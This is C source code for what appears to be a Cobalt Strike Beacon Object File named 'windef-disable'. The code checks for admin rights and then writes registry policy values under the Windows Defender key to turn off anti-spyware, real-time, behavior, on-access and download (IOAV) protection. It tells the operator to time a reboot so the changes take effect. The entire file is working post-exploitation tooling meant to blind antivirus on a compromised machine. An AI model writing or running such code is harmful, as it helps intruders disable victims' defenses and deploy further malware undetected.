/*
	Author: @mooolight
	
	Credits:
	- reenz0h (twitter: @SEKTOR7net)
	- cocomelonc

*/

#include <windows.h>
#include <stdio.h>
#include "..\beacon.h"

#pragma comment (lib, "kernel32")
#pragma comment (lib, "advapi32")
#pragma comment (lib, "msvcrt")

// Kernel32 imports
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess();
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);


// Advapi32 imports
WINADVAPI BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE,DWORD,PHANDLE);
WINADVAPI BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE,TOKEN_INFORMATION_CLASS,LPVOID, DWORD, PDWORD);
WINADVAPI LSTATUS WINAPI ADVAPI32$RegOpenKeyExA(HKEY,LPCSTR,DWORD,REGSAM,PHKEY);
WINADVAPI LSTATUS WINAPI ADVAPI32$RegSetValueExA(HKEY,LPCSTR,DWORD,DWORD,const BYTE *,DWORD);
WINADVAPI LSTATUS WINAPI ADVAPI32$RegCreateKeyExA(HKEY,LPCSTR,DWORD,LPSTR,DWORD,REGSAM,const LPSECURITY_ATTRIBUTES,PHKEY,LPDWORD);
WINADVAPI LSTATUS WINAPI ADVAPI32$RegCloseKey(HKEY);



// Check for admin rights
BOOL isUserAdmin(void) {
	BOOL isElevated = FALSE;
	HANDLE token;
	TOKEN_ELEVATION elev;
	DWORD size;
	
	if(ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &token)) {
		if(ADVAPI32$GetTokenInformation(token, TokenElevation, &elev, sizeof(elev), &size))
			isElevated = elev.TokenIsElevated;
	}
	
	if(token) {
		KERNEL32$CloseHandle(token);
		token = NULL;
	}
	return isElevated;
}


// Usage: windef-disable
void go(char *args, int alen) {
	HKEY key;
	HKEY new_key;
	DWORD disable = 1;
	
	if(!isUserAdmin()){
		BeaconPrintf(CALLBACK_OUTPUT, "[-] Please escalate privilege.\n");
		return;
	}
	
	LONG res = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender",0,KEY_ALL_ACCESS,&key);
	if(res == ERROR_SUCCESS) {
		ADVAPI32$RegSetValueExA(key, "DisableAntiSpyware",0,REG_DWORD, (const BYTE*) &disable, sizeof(disable));
		ADVAPI32$RegCreateKeyExA(key, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);
		ADVAPI32$RegSetValueExA(new_key, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
		ADVAPI32$RegSetValueExA(new_key, "DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
		ADVAPI32$RegSetValueExA(new_key, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
		ADVAPI32$RegSetValueExA(new_key, "DisableOnAccessProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
		ADVAPI32$RegSetValueExA(new_key, "DisableIOAVProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
	
		ADVAPI32$RegCloseKey(key);
		ADVAPI32$RegCloseKey(new_key);
	}
	
	BeaconPrintf(CALLBACK_OUTPUT,"Perfectly disabled! Restart the machine to take effect. Find the right timing to do so...\n");
	return;
}